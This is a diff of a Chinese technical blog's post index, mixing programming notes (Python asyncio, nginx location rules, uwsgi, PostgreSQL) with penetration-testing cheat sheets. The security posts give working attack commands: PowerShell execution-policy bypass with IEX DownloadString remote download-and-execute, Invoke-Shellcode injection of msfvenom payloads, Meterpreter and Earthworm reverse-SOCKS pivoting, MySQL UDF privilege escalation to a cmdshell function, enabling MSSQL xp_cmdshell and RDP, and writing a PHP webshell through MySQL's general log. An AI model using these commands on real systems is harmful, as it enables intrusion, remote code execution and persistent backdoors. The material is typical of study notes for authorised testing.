-    <content type="text"><![CDATA[闲来无事,给学校多个系统写了个命令行客户端,目前可以进入教务网和sakai,对会话进行了缓存，各个系统之间切换非常快速便捷 项目传送门 0x1环境 Pipfile,Pipfile.lock中可以看到所有依赖信息git clone https://github.com/taopeach1998/CQU.git pipenv --python 3 pipenv install pipenv shell python manage.py 0x2使用 当前教务网系统实现查成绩功能，sakai系统实现查看本学期课程未完成作业功能 help可以查看当前可用命令 help [命令] 可以查看命令使用方式 可以在conf/config.ini 中手动配置账号密码，也可以使用cconfig 命令配置 jww是教务网账号密码,com_login是统一认证登录账号密码 0x3插件 可以以插件的方式向现有的jww,sakai系统增加新的功能,只需要在plugin/sakai或者plugin/jww中添加文件即可 一个例子 ''' :desc:这是一个测试 :usage: test ''' def run(session,args): ''' :param session: requests.Session对象,当前系统的会话 :param args:一个列表 ''' print('this is a test!') 文件名字就是插件名字 :desc: 插件描述 :usage: 插件使用方式 run函数必须存在]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Python异步IO]]></title>
-    <url>%2F2018%2F09%2F09%2Fpython-e5-bc-82-e6-ad-a5io%2F</url>
-    <content type="text"><![CDATA[asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。 1.@ asyncio.coroutine/yield from @asyncio.coroutine把一个函数标记为协程 yield from针对耗时的操作进行挂起，函数让出控制权 import timeimport asyncioimport randomnow = lambda : time.time()@asyncio.coroutinedef do_some_work(x): print("&#123;&#125; start".format(x)) yield from asyncio.sleep(2) print("&#123;&#125; end".format(x))start = now()loop = asyncio.get_event_loop()tasks = [asyncio.ensure_future(do_some_work(i)) for i in range(10)]loop.run_until_complete(asyncio.wait(tasks))print("Time:",now()-start) 2.async/await async代替@asyncio.coroutine await代替yield from import timeimport asyncioimport randomnow = lambda : time.time()async def do_some_work(x): print("&#123;&#125; start".format(x)) await asyncio.sleep(2) print("&#123;&#125; end".format(x))start = now()loop = asyncio.get_event_loop()tasks = [asyncio.ensure_future(do_some_work(i)) for i in range(10)]loop.run_until_complete(asyncio.wait(tasks))print("Time:",now()-start) 3.aiohttpimport asyncio import aiohttp async def task(url): print(&apos;start {}&apos;.format(url)) async with aiohttp.ClientSession() as session: async with session.get(url) as resp: content=await resp.text() print(&apos;{1} bytes from {0}&apos;.format(url,len(content))) urls=[&apos;https://github.com/&apos;,&apos;https://www.baidu.com/&apos;,&apos;https://www.python.org/&apos;] event_loop=asyncio.get_event_loop() tasks=[asyncio.ensure_future(task(i)) for i in urls] event_loop.run_until_complete(asyncio.wait(tasks)) 4.gevent python通过yield提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。 monkey.patch_all()将python的一些标准库(thread/socket等)改成非阻塞 遇到io阻塞自动挂起，执行其他任务 from gevent import monkeymonkey.patch_all()import geventfrom urllib import requestdef f(url): print('GET: %s' % url) resp = request.urlopen(url) data = resp.read() print('%d bytes received from %s.' % (len(data), url))gevent.joinall([ gevent.spawn(f, 'https://github.com/'), gevent.spawn(f, 'https://www.baidu.com/'), gevent.spawn(f, ' https://www.python.org/'),])]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[绕过CDN查找真实ip]]></title>
-    <url>%2F2018%2F09%2F02%2Fe7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip%2F</url>
-    <content type="text"><![CDATA[可通过多地ping的方法，判断是否加了cdn 内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。 扫描测试文件，如phpinfo，test等 子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip 国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了 域名的解析记录。通过在线网站（http://site.ip138.com） ，查询域名的历史解析记录和当前解析记录 app。目标网可能有自己的app，通过抓包可能获得到目标真实ip]]></content>
+    <title> Mysql udf提权		</title>
+    <url>/2018/07/29/mysql-udf-e6-8f-90-e6-9d-83/</url>
+    <content><![CDATA[<h4 id="1-（前期准备）得到udf-dll-16进制"><a href="#1-（前期准备）得到udf-dll-16进制" class="headerlink" title="1.（前期准备）得到udf.dll 16进制"></a>1.（前期准备）得到udf.dll 16进制</h4><p>先在本地用udf专用马将udf.dll导出</p>
+<pre><code>select hex(load_file(&apos;C:\\Users\\si\\Desktop\\udf.dll&apos;)) into dumpfile &apos;C:\\Users\\si\\Desktop\\udf.txt&apos;
+</code></pre><p>得到udf.dll的16进制（outfile 函数会在行末端写入新行，还会转义换行符，导致2进制可执行文件会被破坏，而dumpfile函数不对任何列或行进行终止，也不执行任何转义处理，所以可以得到一个完整的可执行文件） <img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftqho3s5puj30tq0460sm.jpg" alt><br><a id="more"></a></p>
+<h4 id="2-在靶机将udf-dll导出到相应目录"><a href="#2-在靶机将udf-dll导出到相应目录" class="headerlink" title="2.在靶机将udf.dll导出到相应目录"></a>2.在靶机将udf.dll导出到相应目录</h4><blockquote>
+<p>mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/ mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
+</blockquote>
+<p>导出udf.dll(xxx就是上一步得到的udf.dll的16进制)</p>
+<pre><code>select unhex(&apos;xxxx&apos;) into dumpfile &apos;c:/windows/system32/udf.dll&apos;
+</code></pre><p>使用NTFS ADS流创建lib、plugin文件夹</p>
+<pre><code>select @@basedir;   //查找mysql的目录
+select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib::$INDEX_ALLOCATION&apos;;    //使用NTFS ADS流创建lib目录
+select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib/plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS再次创建plugin目录
+</code></pre><h4 id="3-创建函数-执行命令"><a href="#3-创建函数-执行命令" class="headerlink" title="3.创建函数/执行命令"></a>3.创建函数/执行命令</h4><pre><code>create function cmdshell returns string soname &apos;udf.dll&apos;;
+select cmdshell(&apos;whoami&apos;);
+drop function cmdshell; 删除函数
+delete from mysql.func where name=&apos;cmdshell&apos;  删除函数
+</code></pre>]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[flask+nginx+uwsgi配置]]></title>
-    <url>%2F2018%2F08%2F12%2Fflasknginxuwsgi-e9-85-8d-e7-bd-ae%2F</url>
-    <content type="text"><![CDATA[uwsgi配置（.ini）[uwsgi] socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写 wsgi-file = manage.py #项目启动文件 callable = app #主应用名 processes = 4 #开启进程数 buffer-size = 65535 master = true #允许uwsgi主进程 plugins = python #解决python与uwsgi兼容问题 #sudo apt-get install uwsgi-plugin-python uid=1000 #设置运行用户uid/用户名 gid=1000 #用户组id disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中 logto =uwsgi_web.log virtualenv＝/home/proj/virtualenv #python虚拟环境 nginx配置server { listen 1234;#web服务监听端口 server_name 0.0.0.0;#域名/ip location / { include uwsgi_params; uwsgi_pass 127.0.0.1:5001;#uwsgi监听的端口或者socket文件，unix:/tmp/uwsgi.sock,nginx需要有对文件的写权限 } }]]></content>
+    <title> Nginx location规则		</title>
+    <url>/2019/02/24/nginx-location-e8-a7-84-e5-88-99/</url>
+    <content><![CDATA[<blockquote>
+<p>官方文档:<code>http://nginx.org/en/docs/http/ngx_http_core_module.html#location</code></p>
+</blockquote>
+<pre><code>Syntax :    location [ = | ~ | ~* | ^~ ] uri { ... }
+            location @name { ... }
+Default:    —
+Context:    server, location
+</code></pre><ul>
+<li><code>=</code>，<code>^~</code>，<code>空</code>，定义前缀字符串(普通location)(官网叫prefix locations)</li>
+<li><code>~</code>和<code>~*(大小写不敏感)</code>定义正则表达式（正则location）</li>
+<li><code>@</code>定义一个命名的location，用于重定向</li>
+<li>对于一个请求进行匹配，最先匹配普通location，并且最终<code>(没有正则匹配前)</code>的匹配结果为最长前缀匹配<code>(从请求的开头开始，尽可能长的匹配)</code></li>
+<li>接下来进行正则location匹配，根据在配置文件中的顺序，<code>在第一次成功匹配时结束</code>，并使用相应的配置，如果没有匹配，则用普通location的匹配结果</li>
+<li>如果最大前缀匹配使用<code>^~</code>，则不进行后面的正则匹配</li>
+<li><code>=</code>表示精确匹配，一旦匹配，就结束<a id="more"></a>
+</li>
+</ul>
+<blockquote>
+<p>官网的例子</p>
+</blockquote>
+<pre><code>location = / {
+    [ configuration A ]
+}
+
+location / {
+    [ configuration B ]
+}
+
+location /documents/ {
+    [ configuration C ]
+}
+
+location ^~ /images/ {
+    [ configuration D ]
+}
+
+location ~* \.(gif|jpg|jpeg)$ {
+    [ configuration E ]
+}
+</code></pre><ul>
+<li><code>&#39;/&#39;</code>匹配A</li>
+<li><code>&#39;/index.html&#39;</code>匹配B</li>
+<li><code>&#39;/documents/document.html&#39;</code>匹配C</li>
+<li><code>&#39;/images/1.gif&#39;</code>匹配D</li>
+<li><code>&#39;/documents/1.jpg&#39;</code>匹配E</li>
+</ul>
+]]></content>
       <categories>
         <category>WEB前端/后端</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[内网渗透之进入内网]]></title>
-    <url>%2F2018%2F08%2F05%2Fe5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91%2F</url>
-    <content type="text"><![CDATA[1.msf拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网 meterpreter&gt;run get_local_subnets //获取子网/子网掩码 添加路由 meterpreter&gt;run autoroute -s 子网/子网掩码 或 msf&gt;route add 子网 子网掩码 seesion_id 内网主机存活扫描 meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 使nmap等工具也可以扫描内网 1.scoks4代理（支持tcp,sock5支持tcp/udp） use auxiliary/server/socks4a 2.proxychains/proxifier等全局代理软件 proxychains4 nmap -sT ip 2.proxychains/proxifier+reGeorg1.上传tunnel脚本到靶机 2.python reGeorgSocksProxy.py -u http://ip/tunnel //开启socks服务 3.配置proxychains/proxifier使用socks服务 3.Earthworm(socks5代理)1.正向，在靶机开启socks服务 ew –s ssocksd –l 888 2.反向 本机添加一个转接隧道，把1080端口收到的代理请求转交给888端口 ew -s rcsocks -l 1008 -e 888 在靶机上开启socks服务，并反弹到本机888端口上 ew -s rssocks -d 本机ip -e 888 接下来就可以配置全局代理软件访问本机1008端口使用靶机socks服务了]]></content>
+    <title> Mssql开启xp_cmdshell		</title>
+    <url>/2018/07/29/mssql-e5-bc-80-e5-90-afxp-cmdshell/</url>
+    <content><![CDATA[<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;,0;
+RECONFIGURE;
+</code></pre><a id="more"></a>
+<h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;, 1;
+RECONFIGURE;
+</code></pre><p>在注入点运行上述语句时,如果出现这样的回显,<code>标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在</code>,可执行以下语句</p>
+<pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;
+RECONFIGURE;
+EXEC sp_configure &apos;user connections&apos;,1;
+RECONFIGURE;
+</code></pre>]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[Nishang/PowerSploit]]></title>
-    <url>%2F2018%2F08%2F05%2Fnishang-powersploit%2F</url>
-    <content type="text"><![CDATA[nishang/powersploit都是针对powershell的渗透工具，提供了丰富powershell脚本，在后渗透的时候，不需要在靶机上上传任何工具，只要一个powershell，就可以远程下载执行脚本 1.Powershell查看执行策略 Get-ExecutionPolicy Restricted //这是默认的设置。不能执行PowerShell脚本 AllSigned //只有数字签名的脚本将会运行，此外，会提示你允许运行那些使用指定的证书签名的脚本 RemoteSigned //经本地编写的脚本将会运行，从网络下载的脚本运行，除非他们签名了并且你批准了的签名的证书 UnRestricted //所有的脚本都将运行 设置执行策略，需要管理员权限 set-ExecutionPolicy 绕过执行策略执行脚本 PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 //远程下载执行 IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;) 在cmd模式下: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;) powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)&quot; 2.Nishang导入所有模块nishang import-module ./nishang.psm1 get-command -module nishang //查看命令 单独导入Invoke-PortScan脚本 IEX (New-Object Net.WebClient).DownloadString(“http://localhost/webTools/nishang/Scan/Invoke-PortScan.ps1”) get-help Invoke-PortScan //查看使用方法 nishang提供了丰富的脚本 3.PowerSploit 用法和nishang一样，有些重叠脚本 Invoke-Shellcode:将shellcode插入您选择的进程ID或本地PowerShell中 IEX (New-Object Net.WebClient).DownloadString(“http://Invoke-Shellcode.ps1”) //导入Invoke-Shellcode脚本 IEX (New-Object Net.WebClient).DownloadString(“http://msf.ps1”) //导入msfvenom生成的木马 Invoke-Shellcode -Shellcode ($buf) //直接运行 Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行]]></content>
+    <title> Nishang/PowerSploit		</title>
+    <url>/2018/08/05/nishang-powersploit/</url>
+    <content><![CDATA[<blockquote>
+<p>nishang/powersploit都是针对powershell的渗透工具，提供了丰富powershell脚本，在后渗透的时候，不需要在靶机上上传任何工具，只要一个powershell，就可以远程下载执行脚本</p>
+</blockquote>
+<h3 id="1-Powershell"><a href="#1-Powershell" class="headerlink" title="1.Powershell"></a>1.Powershell</h3><p>查看执行策略</p>
+<pre><code>Get-ExecutionPolicy
+
+Restricted  //这是默认的设置。不能执行PowerShell脚本
+AllSigned   //只有数字签名的脚本将会运行，此外，会提示你允许运行那些使用指定的证书签名的脚本
+RemoteSigned    //经本地编写的脚本将会运行，从网络下载的脚本运行，除非他们签名了并且你批准了的签名的证书
+UnRestricted    //所有的脚本都将运行
+</code></pre><a id="more"></a>
+<p>设置执行策略，需要管理员权限</p>
+<pre><code>set-ExecutionPolicy
+</code></pre><p>绕过执行策略执行脚本</p>
+<pre><code>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1
+
+//远程下载执行
+IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
+在cmd模式下:
+powershell IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
+powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)&quot;
+</code></pre><h3 id="2-Nishang"><a href="#2-Nishang" class="headerlink" title="2.Nishang"></a>2.Nishang</h3><p>导入所有模块nishang</p>
+<pre><code>import-module ./nishang.psm1
+
+get-command -module nishang     //查看命令
+</code></pre><p>单独导入Invoke-PortScan脚本</p>
+<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://localhost/webTools/nishang/Scan/Invoke-PortScan.ps1”)
+
+get-help Invoke-PortScan //查看使用方法
+</code></pre><p>nishang提供了丰富的脚本 <img src="https://s1.ax1x.com/2018/08/05/PDo9gA.png" alt="PDo9gA.png"></p>
+<h3 id="3-PowerSploit"><a href="#3-PowerSploit" class="headerlink" title="3.PowerSploit"></a>3.PowerSploit</h3><blockquote>
+<p>用法和nishang一样，有些重叠脚本</p>
+</blockquote>
+<p>Invoke-Shellcode:将shellcode插入您选择的进程ID或本地PowerShell中</p>
+<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://Invoke-Shellcode.ps1”) //导入Invoke-Shellcode脚本
+IEX (New-Object Net.WebClient).DownloadString(“http://msf.ps1”) //导入msfvenom生成的木马
+Invoke-Shellcode -Shellcode ($buf) //直接运行
+Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行
+</code></pre>]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[windows提权对照表]]></title>
-    <url>%2F2018%2F08%2F03%2Fwindows-e6-8f-90-e6-9d-83-e5-af-b9-e7-85-a7-e8-a1-a8%2F</url>
-    <content type="text"><![CDATA[exp下载地址 #Security Bulletin #KB #Description #Operating System CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008)MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP)MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012)MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012)MS16-016 [KB3136041] [WebDAV] (2008/Vista/7)MS15-097 [KB3089656] [remote code execution] (win8.1/2012)MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012)MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012)MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012)MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012)MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8)MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2)MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8)MS14-070 [KB2989935] [Kernel Driver] (2003)MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8)MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8)MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8)MS14-002 [KB2914368] [NDProxy] (2003/XP)MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7)MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7)MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8)MS12-042 [KB2972621] [Service Bus] (2008/2012/win7)MS12-020 [KB2671387] [RDP] (2003/2008/7/XP)MS11-080 [KB2592799] [AFD.sys] (2003/XP)MS11-062 [KB2566454] [NDISTAPI] (2003/XP)MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP)MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista)MS10-092 [KB2305420] [Task Scheduler] (2008/7)MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5)MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista)MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP)MS09-050 [KB975517] [Remote Code Execution] (2008/Vista)MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0)MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista)MS08-068 [KB957097] [Remote Code Execution] (2000/XP)MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008)MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista)MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000)MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[cmd开启3389]]></title>
-    <url>%2F2018%2F07%2F29%2Fcmd-e5-bc-80-e5-90-af3389%2F</url>
-    <content type="text"><![CDATA[win2003wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 win2003，xpREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Mysql udf提权]]></title>
-    <url>%2F2018%2F07%2F29%2Fmysql-udf-e6-8f-90-e6-9d-83%2F</url>
-    <content type="text"><![CDATA[1.（前期准备）得到udf.dll 16进制先在本地用udf专用马将udf.dll导出 select hex(load_file(&apos;C:\\Users\\si\\Desktop\\udf.dll&apos;)) into dumpfile &apos;C:\\Users\\si\\Desktop\\udf.txt&apos; 得到udf.dll的16进制（outfile 函数会在行末端写入新行，还会转义换行符，导致2进制可执行文件会被破坏，而dumpfile函数不对任何列或行进行终止，也不执行任何转义处理，所以可以得到一个完整的可执行文件） 2.在靶机将udf.dll导出到相应目录 mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/ mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\ 导出udf.dll(xxx就是上一步得到的udf.dll的16进制) select unhex(&apos;xxxx&apos;) into dumpfile &apos;c:/windows/system32/udf.dll&apos; 使用NTFS ADS流创建lib、plugin文件夹 select @@basedir; //查找mysql的目录 select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib::$INDEX_ALLOCATION&apos;; //使用NTFS ADS流创建lib目录 select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib/plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS再次创建plugin目录 3.创建函数/执行命令create function cmdshell returns string soname &apos;udf.dll&apos;; select cmdshell(&apos;whoami&apos;); drop function cmdshell; 删除函数 delete from mysql.func where name=&apos;cmdshell&apos; 删除函数]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Mssql开启xp_cmdshell]]></title>
-    <url>%2F2018%2F07%2F29%2Fmssql-e5-bc-80-e5-90-afxp-cmdshell%2F</url>
-    <content type="text"><![CDATA[关闭EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项 RECONFIGURE; EXEC sp_configure &apos;xp_cmdshell&apos;,0; RECONFIGURE; 开启EXEC sp_configure &apos;show advanced options&apos;, 1; RECONFIGURE; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; RECONFIGURE; 在注入点运行上述语句时,如果出现这样的回显,标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在,可执行以下语句 EXEC sp_configure &apos;show advanced options&apos;,1; RECONFIGURE; EXEC sp_configure &apos;user connections&apos;,1; RECONFIGURE;]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Mysql日志拿shell]]></title>
-    <url>%2F2018%2F07%2F29%2Fmysql-e6-97-a5-e5-bf-97-e6-8b-bfshell%2F</url>
-    <content type="text"><![CDATA[set global general_log = on; set global general_log_file = &apos;C:/phpStudy/WWW/sinight.php&apos;; select &apos;&lt;?php @assert($_POST[&quot;sinight&quot;]); ?&gt;&apos;; set global general_log = off;]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[linux postgresql 使用]]></title>
-    <url>%2F2018%2F07%2F27%2Flinux-postgresql-e4-bd-bf-e7-94-a8%2F</url>
-    <content type="text"><![CDATA[正常情况下，安装完成后，PostgreSQL服务器会自动在本机的5432端口开启。 初次安装后，默认生成一个名为postgres的数据库和一个名为postgres的数据库用户同时还生成了一个名为postgres的Linux系统用户。 1.创建数据库1.使用postgresql控制台创建切换到postgres用户 su postgres 下一步，使用psql命令登录PostgreSQL控制台。 psql 这时相当于系统用户postgres以同名数据库用户的身份，登录同名数据库，这是不用输入密码的。 完整命令 psql -d 数据库名称 -U 用户名称 --password 密码 使用\password命令，为postgres用户设置一个密码。 \password postgres 创建数据库用户test，并设置密码。 CREATE USER test WITH PASSWORD &apos;password&apos;; 创建用户数据库，这里为exampledb，并指定所有者为test。 CREATE DATABASE exampledb OWNER test; 将exampledb数据库的所有权限都赋予test，否则test只能登录控制台，没有任何数据库操作权限。 GRANT ALL PRIVILEGES ON DATABASE exampledb to test; 2.使用shell命令行PostgreSQL提供了命令行程序createuser和createdb。 创建数据库用户test，并指定其为超级用户。 sudo -u postgres createuser --superuser test 创建数据库exampledb sudo -u postgres createdb -O dbuser exampledb 2.删除数据库命令行 sudo -u postgres dropdb test psql sudo -u postgres psql DROP DATABASE test; 3.psql的一些命令\q:退出 \password:设置密码 \h：查看SQL命令的解释，比如\h select。 \?：查看psql命令列表。 \l：列出所有数据库。 \c [database_name]：连接其他数据库。 \d：列出当前数据库的所有表格。 \d [table_name]：列出某一张表格的结构。 \du：列出所有用户。 \e：打开文本编辑器。 \conninfo：列出当前数据库和连接的信息。]]></content>
+    <title> Python异步IO		</title>
+    <url>/2018/09/09/python-e5-bc-82-e6-ad-a5io/</url>
+    <content><![CDATA[<blockquote>
+<p>asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。</p>
+</blockquote>
+<h3 id="1-asyncio-coroutine-yield-from"><a href="#1-asyncio-coroutine-yield-from" class="headerlink" title="1.@ asyncio.coroutine/yield from"></a>1.@ asyncio.coroutine/yield from</h3><ul>
+<li><font color="#ff2a2a">@asyncio.coroutine</font>把一个函数标记为协程</li>
+<li><code>yield from</code>针对耗时的操作进行挂起，函数让出控制权<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"><span class="meta">@asyncio.coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-async-await"><a href="#2-async-await" class="headerlink" title="2.async/await"></a>2.async/await</h3><ul>
+<li><code>async</code>代替<font color="#ff2a2a">@asyncio.coroutine</font></li>
+<li><code>await</code>代替<code>yield from</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
+<h3 id="3-aiohttp"><a href="#3-aiohttp" class="headerlink" title="3.aiohttp"></a>3.aiohttp</h3><pre><code>import asyncio
+import aiohttp
+
+
+async def task(url):
+    print(&apos;start {}&apos;.format(url))
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+            content=await resp.text()
+            print(&apos;{1} bytes from {0}&apos;.format(url,len(content)))
+
+urls=[&apos;https://github.com/&apos;,&apos;https://www.baidu.com/&apos;,&apos;https://www.python.org/&apos;]
+
+event_loop=asyncio.get_event_loop()
+
+tasks=[asyncio.ensure_future(task(i)) for i in urls]
+
+event_loop.run_until_complete(asyncio.wait(tasks))
+</code></pre><h3 id="4-gevent"><a href="#4-gevent" class="headerlink" title="4.gevent"></a>4.gevent</h3><ul>
+<li>python通过yield提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。</li>
+<li>monkey.patch_all()将python的一些标准库(thread/socket等)改成非阻塞</li>
+<li>遇到io阻塞自动挂起，执行其他任务</li>
+</ul>
